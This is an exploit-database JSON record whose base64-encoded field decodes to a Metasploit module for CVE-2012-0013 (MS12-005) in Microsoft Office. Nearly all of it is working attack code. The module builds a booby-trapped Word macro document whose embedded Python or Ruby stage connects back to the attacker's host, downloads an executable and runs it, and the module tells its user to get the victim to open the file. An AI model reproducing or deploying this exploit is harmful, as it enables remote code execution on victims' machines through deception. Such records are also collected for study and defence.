{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgRnJhbWV3b3JrIHdlYiBzaXRlIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIGxpY2Vuc2luZyBhbmQgdGVybXMgb2YgdXNlLg0KIyAgIGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9mcmFtZXdvcmsvDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCnJlcXVpcmUgJ3JleC96aXAnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkZJTEVGT1JNQVQNCglpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6VGNwU2VydmVyDQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAiTVMxMi0wMDUgTWljcm9zb2Z0IE9mZmljZSBDbGlja09uY2UgVW5zYWZlIE9iamVjdCBQYWNrYWdlIEhhbmRsaW5nIFZ1bG5lcmFiaWxpdHkiLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGZvdW5kIGluIE1pY3Jvc29mdCBPZmZpY2UncyBDbGlja09uY2UNCgkJCQlmZWF0dXJlLiAgV2hlbiBoYW5kbGluZyBhIE1hY3JvIGRvY3VtZW50LCB0aGUgYXBwbGljYXRpb24gZmFpbHMgdG8gcmVjb2duaXplDQoJCQkJY2VydGFpbiBmaWxlIGV4dGVuc2lvbnMgYXMgZGFuZ2Vyb3VzIGV4ZWN1dGFibGVzLCB3aGljaCBjYW4gYmUgdXNlZCB0byBieXBhc3MNCgkJCQl0aGUgd2FybmluZyBtZXNzYWdlLiAgVGhpcyBhbGxvd3MgeW91IHRvIHRyaWNrIHlvdXIgdmljdGltIGludG8gb3BlbmluZyB0aGUNCgkJCQltYWxpY2lvdXMgZG9jdW1lbnQsIHdoaWNoIHdpbGwgbG9hZCB1cCBlaXRoZXIgYSBweXRob24gb3IgcnVieSBwYXlsb2FkIGJhc2VkIG9uDQoJCQkJeW91ciBjaG9vc2luZywgYW5kIHRoZW4gZmluYWxseSBkb3dubG9hZCBhbmQgZXhlY3V0ZSBvdXIgZXhlY3V0YWJsZS4NCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ1lvcmljayBLb3N0ZXInLCAjVnVsbiBkaXNjb3ZlcnkNCgkJCQkJJ3Npbm4zcicgICAgICAgICAjTWV0YXNwbG9pdA0KCQkJCV0sDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbJ0NWRScsICcyMDEyLTAwMTMnXSwNCgkJCQkJWydPU1ZEQicsICc3ODIwNyddLA0KCQkJCQlbJ01TQicsICdtczEyLTAwNSddLA0KCQkJCQlbJ0JJRCcsICc1MTI4NCddLA0KCQkJCQlbJ1VSTCcsICdodHRwOi8vc3VwcG9ydC5taWNyb3NvZnQuY29tL2RlZmF1bHQuYXNweD9zY2lkPWtiO0VOLVVTOzI1ODQxNDYnXSwNCgkJCQkJWydVUkwnLCAnaHR0cDovL2V4cGxvaXRzaG9wLndvcmRwcmVzcy5jb20vMjAxMi8wMS8xNC9tczEyLTAwNS1lbWJlZGRlZC1vYmplY3QtcGFja2FnZS1hbGxvdy1hcmJpdHJhcnktY29kZS1leGVjdXRpb24vJ10NCgkJCQldLA0KCQkJJ1BheWxvYWQnICAgICAgICA9Pg0KCQkJCXsNCgkJCQkJJ0JhZENoYXJzJyA9PiAiXHgwMCINCgkJCQl9LA0KCQkJJ0RlZmF1bHRPcHRpb25zJyAgPT4NCgkJCQl7DQoJCQkJCSdFeGl0RnVuY3Rpb24nICAgICAgICAgID0+ICJub25lIiwNCgkJCQkJJ0Rpc2FibGVQYXlsb2FkSGFuZGxlcicgPT4gJ2ZhbHNlJw0KCQkJCX0sDQoJCQknUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWydNaWNyb3NvZnQgT2ZmaWNlIFdvcmQgMjAwNy8yMDEwIG9uIFdpbmRvd3MgNycsIHt9XSwNCgkJCQldLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gIkphbiAxMCAyMDEyIiwNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQkJWw0KCQkJCQlPcHRFbnVtLm5ldygnUEFZTE9BRF9UWVBFJywgW3RydWUsICJUaGUgaW5pdGlhbCBwYXlsb2FkIHR5cGUiLCAnUFlUSE9OJywgJXcoUlVCWSBQWVRIT04pXSksDQoJCQkJCU9wdFN0cmluZy5uZXcoIkJPRFkiLCBbZmFsc2UsICdUaGUgbWVzc2FnZSBmb3IgdGhlIGRvY3VtZW50IGJvZHknLCAnJ10pLA0KCQkJCQlPcHRTdHJpbmcubmV3KCdGSUxFTkFNRScsIFt0cnVlLCAnVGhlIE9mZmljZSBkb2N1bWVudCBtYWNybyBmaWxlJywgJ21zZi5kb2NtJ10pDQoJCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KDQoJIw0KCSMgUmV0dXJuIHRoZSBmaXJzdC1zdGFnZSBwYXlsb2FkIHRoYXQgd2lsbCBkb3dubG9hZCBvdXIgbWFsaWNpb3VzIGV4ZWN1dGFibGUuDQoJIw0KCWRlZiBnZXRfZG93bmxvYWRfZXhlY19wYXlsb2FkKHR5cGUsIGxob3N0LCBscG9ydCkNCgkJcGF5bG9hZF9uYW1lID0gUmV4OjpUZXh0LnJhbmRfdGV4dF9hbHBoYSg3KQ0KDQoJCSMgUGFkZCB1cCA2IG51bGwgYnl0ZXMgc28gdGhlIGZpcnN0IGZldyBjaGFyYWN0ZXJzIHdvbid0IGdldCBjdXQgb2ZmDQoJCXAgPSAiXHgwMCIqNg0KDQoJCWNhc2UgdHlwZQ0KCQl3aGVuIDpyYg0KCQkJcCA8PCAlUXwNCgkJCXJlcXVpcmUgJ3NvY2tldCcNCgkJCXJlcXVpcmUgJ3RlbXBmaWxlJw0KCQkJYmVnaW4NCgkJCQljbGkgPSBUQ1BTb2NrZXQub3BlbigiI3tsaG9zdH0iLCN7bHBvcnR9KQ0KCQkJCWJ1ZiA9ICcnDQoJCQkJd2hpbGUgbCA9IGNsaS5nZXRzDQoJCQkJCWJ1ZiA8PCBsDQoJCQkJZW5kDQoJCQkJY2xpLmNsb3NlDQoJCQkJdG1wID0gVGVtcGZpbGUubmV3KFsnI3twYXlsb2FkX25hbWV9JywnLmV4ZSddKQ0KCQkJCXQgPSB0bXAucGF0aA0KCQkJCXRtcC5iaW5tb2RlDQoJCQkJdG1wLndyaXRlKGJ1ZikNCgkJCQl0bXAuY2xvc2UNCgkJCQlleGVjKHQpDQoJCQlyZXNjdWUNCgkJCWVuZCN8DQoNCgkJd2hlbiA6cHkNCgkJCXAgPDwgJVF8DQoJCQlpbXBvcnQgc29ja2V0DQoJCQlpbXBvcnQgdGVtcGZpbGUNCgkJCWltcG9ydCBvcw0KDQoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KCQkJcy5jb25uZWN0KCgiI3tsaG9zdH0iLCAje2xwb3J0fSkpDQoJCQlidWYgPSAiIg0KCQkJd2hpbGUgVHJ1ZToNCgkJCQlkYXRhID0gcy5yZWN2KDEwMjQpDQoJCQkJaWYgZGF0YToNCgkJCQkJYnVmICs9IGRhdGENCgkJCQllbHNlOg0KCQkJCQlicmVhaw0KCQkJcy5jbG9zZQ0KCQkJdGVtcCA9IHRlbXBmaWxlLmdldHRlbXBkaXIoKSArICJcXFxcXFwiICsgIiN7cGF5bG9hZF9uYW1lfS5leGUiDQoJCQlmID0gb3Blbih0ZW1wLCAid2IiKQ0KCQkJZi53cml0ZShidWYpDQoJCQlmLmNsb3NlDQoJCQlmID0gTm9uZQ0KCQkJb3Muc3lzdGVtKHRlbXApDQoJCQkjfA0KDQoJCWVuZA0KDQoJCXAgPSBwLmdzdWIoL15cdFx0XHQvLCAnJykNCg0KCQlyZXR1cm4gcA0KCWVuZA0KDQoNCgkjDQoJIyBSZWFkcyBhIGZpbGUgdGhhdCdsbCBiZSBwYWNrYWdlZC4NCgkjIFRoaXMgd2lsbCBwYXRjaCBjZXJ0YWluIGZpbGVzIG9uIHRoZSBmbHksIG9yIHJldHVybiB0aGUgb3JpZ2luYWwgY29udGVudCBvZiB0aGUgZmlsZS4NCgkjDQoJZGVmIG9uX2ZpbGVfcmVhZChmbmFtZSwgZmlsZSkNCgkJZiA9IG9wZW4oZmlsZSwgJ3JiJykNCgkJYnVmID0gZi5yZWFkDQoJCWYuY2xvc2UNCg0KCQkjIE1vZGlmeSBjZXJ0YWluIGZpbGVzIG9uIHRoZSBmbHkNCgkJY2FzZSBmaWxlDQoJCXdoZW4gL29sZU9iamVjdDFcLmJpbi8NCgkJCSMgUGF0Y2ggdGhlIE9MRSBvYmplY3QgZmlsZSB3aXRoIG91ciBwYXlsb2FkDQoJCQlwcmludF9zdGF0dXMoIlBhdGNoaW5nIE9MRSBvYmplY3QiKQ0KCQkJcHR5cGUgPSBkYXRhc3RvcmVbJ1BBWUxPQURfVFlQRSddID09ICdQWVRIT04nID8gOnB5IDogOnJiDQoJCQlwICAgICA9IGdldF9kb3dubG9hZF9leGVjX3BheWxvYWQocHR5cGUsIEBpcCwgQHBvcnQpDQoJCQlidWYgICA9IGJ1Zi5nc3ViKC9NWVBBWUxPQUQvLCBwKQ0KDQoJCQkjIFBhdGNoIHVzZXJuYW1lDQoJCQl1c2VybmFtZSA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNSkNCgkJCWJ1ZiA9IGJ1Zi5nc3ViKC9NRVRBU1BMT0lULywgdXNlcm5hbWUpDQoJCQlidWYgPSBidWYuZ3N1YigvI3tSZXg6OlRleHQudG9fdW5pY29kZSgiTUVUQVNQTE9JVCIpfS8sIFJleDo6VGV4dC50b191bmljb2RlKHVzZXJuYW1lKSkNCg0KCQkJIyBQYXRjaCB0aGUgZmlsZW5hbWUNCgkJCWYgPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDYpDQoJCQlidWYgPSBidWYuZ3N1YigvTVlGSUxFTkFNRS8sIGYpDQoJCQlidWYgPSBidWYuZ3N1YigvI3tSZXg6OlRleHQudG9fdW5pY29kZSgiTVlGSUxFTkFNRSIpfS8sIFJleDo6VGV4dC50b191bmljb2RlKGYpKQ0KDQoJCQkjIFBhdGNoIHRoZSBleHRlbnNpb24gbmFtZQ0KCQkJZXh0ID0gcHR5cGUudG9fcw0KCQkJYnVmID0gYnVmLmdzdWIoL01ZRVhULywgZXh0KQ0KCQkJYnVmID0gYnVmLmdzdWIoLyN7UmV4OjpUZXh0LnRvX3VuaWNvZGUoIk1ZRVhUIil9LywgUmV4OjpUZXh0LnRvX3VuaWNvZGUoZXh0KSkNCg0KCQl3aGVuIC9kb2N1bWVudFwueG1sLw0KCQkJcHJpbnRfc3RhdHVzKCJQYXRjaGluZyBkb2N1bWVudCBib2R5IikNCgkJCSMgUGF0Y2ggdGhlIGRvY3ggYm9keQ0KCQkJYnVmID0gYnVmLmdzdWIoL1cwMFRXMDBULywgZGF0YXN0b3JlWydCT0RZJ10pDQoNCgkJZW5kDQoNCgkJIyBUaGUgb3JpZ2luYWwgZmlsZW5hbWUgb2YgX19yZWxzIGlzIGFjdHVhbGx5ICIucmVscyIuDQoJCSMgQnV0IGZvciBzb21lIHJlYXNvbiBpZiB0aGF0J3Mgb3VyIG9yaWdpbmFsIGZpbGVuYW1lLCBpdCB3b24ndCBiZSBpbmNsdWRlZA0KCQkjIGluIHRoZSBhcmNoaXZlLiBTbyB0aGlzIGhhY2tzIGFyb3VuZCB0aGF0Lg0KCQljYXNlIGZuYW1lDQoJCXdoZW4gL19fcmVscy8NCgkJCWZuYW1lID0gZm5hbWUuZ3N1YigvXF9cX3JlbHMvLCAnLnJlbHMnKQ0KCQllbmQNCg0KCQl5aWVsZCBmbmFtZSwgYnVmDQoJZW5kDQoNCg0KCSMNCgkjIFBhY2thZ2VzIHRoZSBPZmZpY2UgTWFjcm8gRG9jdW1lbnQNCgkjDQoJZGVmIHBhY2thZ2VfZG9jbV9yZXgocGF0aCkNCgkJemlwID0gUmV4OjpaaXA6OkFyY2hpdmUubmV3DQoNCgkJRGlyWyIje3BhdGh9LyoqLyoqIl0uZWFjaCBkbyB8ZmlsZXwNCgkJCXAgPSBmaWxlLnN1YihwYXRoKycvJywnJykNCg0KCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGZpbGUpDQoJCQkJcHJpbnRfc3RhdHVzKCJQYWNrZ2luZyBkaXJlY3Rvcnk6ICN7ZmlsZX0iKQ0KCQkJCXppcC5hZGRfZmlsZShwKQ0KCQkJZWxzZQ0KCQkJCW9uX2ZpbGVfcmVhZChwLCBmaWxlKSBkbyB8Zm5hbWUsIGJ1ZnwNCgkJCQkJcHJpbnRfc3RhdHVzKCJQYWNrYWdpbmcgZmlsZTogI3tmbmFtZX0iKQ0KCQkJCQl6aXAuYWRkX2ZpbGUoZm5hbWUsIGJ1ZikNCgkJCQllbmQNCgkJCWVuZA0KCQllbmQNCg0KCQl6aXAucGFjaw0KCWVuZA0KDQoNCgkjDQoJIyBSZXR1cm4gdGhlIG1hbGljaW91cyBleGVjdXRhYmxlDQoJIw0KCWRlZiBvbl9jbGllbnRfY29ubmVjdChjbGkpDQoJCXByaW50X3N0YXR1cygiI3tjbGkucGVlcmhvc3R9OiN7Y2xpLnBlZXJwb3J0fSAtIFNlbmRpbmcgZXhlY3V0YWJsZSAoI3tAZXhlLmxlbmd0aC50b19zfSBieXRlcykiKQ0KCQljbGkucHV0KEBleGUpDQoJCXNlcnZpY2UuY2xvc2VfY2xpZW50KGNsaSkNCgllbmQNCg0KDQoJZGVmIGV4cGxvaXQNCgkJQGlwICAgID0gZGF0YXN0b3JlWydTUlZIT1NUJ10gPT0gJzAuMC4wLjAnID8gUmV4OjpTb2NrZXQuc291cmNlX2FkZHJlc3MoJzUwLjUwLjUwLjUwJykgOiBkYXRhc3RvcmVbJ1NSVkhPU1QnXQ0KCQlAcG9ydCAgPSBkYXRhc3RvcmVbJ1NSVlBPUlQnXQ0KDQoJCXByaW50X3N0YXR1cygiR2VuZXJhdGluZyBvdXIgZG9jbSBmaWxlLi4uIikNCgkJcGF0aCAgPSBGaWxlLmpvaW4oTXNmOjpDb25maWcuaW5zdGFsbF9yb290LCAnZGF0YScsICdleHBsb2l0cycsICdDVkUtMjAxMi0wMDEzJykNCgkJZG9jbSA9IHBhY2thZ2VfZG9jbV9yZXgocGF0aCkNCg0KCQlmaWxlX2NyZWF0ZShkb2NtKQ0KCQlwcmludF9nb29kKCJMZXQgeW91ciB2aWN0aW0gb3BlbiAje2RhdGFzdG9yZVsnRklMRU5BTUUnXX0iKQ0KDQoJCXByaW50X3N0YXR1cygiR2VuZXJhdGluZyBvdXIgbWFsaWNpb3VzIGV4ZWN1dGFibGUuLi4iKQ0KCQlAZXhlID0gZ2VuZXJhdGVfcGF5bG9hZF9leGUNCg0KCQlwcmludF9zdGF0dXMoIlJlYWR5IHRvIGRlbGl2ZXIgeW91ciBwYXlsb2FkIG9uICN7QGlwfToje0Bwb3J0LnRvX3N9IikNCgkJc3VwZXINCgllbmQNCmVuZA0KDQo9YmVnaW4NCm1icDp3aW43X2RpZmYgc2lubjNyJCBkaWZmIHBhdGNoL0dldEN1cnJlbnRJY29uLmMgdnVsbi9HZXRDdXJyZW50SWNvbi5jIA0KMWMxDQo8IHZvaWQgKl9fdGhpc2NhbGwgQ1BhY2thZ2U6Ol9HZXRDdXJyZW50SWNvbih2b2lkICp0aGlzLCBpbnQgYTIpDQotLS0NCj4gY29uc3QgV0NIQVIgKl9fdGhpc2NhbGwgQ1BhY2thZ2U6Ol9HZXRDdXJyZW50SWNvbih2b2lkICp0aGlzLCBpbnQgYTIpDQouLi4NCjI0YzI0DQo8ICAgICBpZiAoIEFzc29jSXNEYW5nZXJvdXMocmVzdWx0KSB8fCAhU0hHZXRGaWxlSW5mb1cocHN6UGF0aCwgMHg4MHUsICZwc2ZpLCAweDJCNHUsIDB4MTEwdSkgKQ0KLS0tDQo+ICAgICBpZiAoIElzUHJvZ0lESW5MaXN0KDAsIHJlc3VsdCwgZXh0TGlzdCwgMHgxMXUpIHx8ICFTSEdldEZpbGVJbmZvVyhwc3pQYXRoLCAweDgwdSwgJnBzZmksIDB4MkI0dSwgMHgxMTB1KSApDQozMWMzMQ0KPWVuZA==", 
    "filename": "platforms/windows/local/19037.rb", 
    "id": "19037", 
    "cves": [
        "CVE-2012-0013"
    ]
}